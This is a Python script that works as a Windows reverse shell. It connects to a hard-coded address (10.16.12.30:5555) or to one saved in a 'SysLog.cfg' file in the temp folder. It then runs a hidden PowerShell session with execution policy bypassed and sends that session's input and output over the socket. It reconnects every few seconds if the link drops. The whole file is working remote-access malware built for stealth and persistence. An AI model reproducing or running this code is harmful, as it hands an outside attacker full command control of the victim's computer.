import socket,subprocess,threading,time,sys,os

def s2p(s, p):
    while True:
        try:
            data = s.recv(1024)
            if len(data) > 0:
                p.stdin.write(data)
                p.stdin.flush()
        except:
            break

def p2s(s, p):
    while True:
        try:
            s.send(p.stdout.read(1))
        except:
            break
    

def is_connection_alive(s):
    try:
        # Try sending empty data to check if connection is still open
        s.send(b'\0')
        return True
    except:
        return False

A = "10.16.12.30"
B = 5555

# Try to read from SysLog.cfg in %temp% folder first
temp_path = os.environ.get('TEMP', '')
config_file = os.path.join(temp_path, 'SysLog.cfg')

try:
    if os.path.exists(config_file):
        with open(config_file, 'r') as f:
            config = f.readline().strip()
            if ':' in config:
                ip, port = config.split(':', 1)
                A = ip
                B = int(port)
except:
    pass

# Command line args still override config file
if (len(sys.argv) >= 2):
        A = sys.argv[1]

if (len(sys.argv) >= 3):
    B = int(sys.argv[2])

# Save to SysLog.cfg
try:
    with open(config_file, 'w') as f:
        f.write(f"{A}:{B}")
except:
    pass

while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((A, B))

        startup_info = subprocess.STARTUPINFO()
        startup_info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startup_info.wShowWindow = 0
        
        p=subprocess.Popen(["C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "-ExecutionPolicy", "Bypass", "-NoProfile"],
                  stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE,
                  startupinfo=startup_info, creationflags=subprocess.CREATE_NO_WINDOW)
        
        s2p_thread = threading.Thread(target=s2p, args=[s, p])
        s2p_thread.daemon = True
        s2p_thread.start()
        
        p2s_thread = threading.Thread(target=p2s, args=[s, p])
        p2s_thread.daemon = True
        p2s_thread.start()
        
        # Check connection every 2 seconds
        while p.poll() is None:
            time.sleep(2)
            if not is_connection_alive(s):
                break        
    except:
        try:
            p.kill()
        except:
            pass
        try:
            s.close()
        except:
            pass
            
        time.sleep(3)
        continue
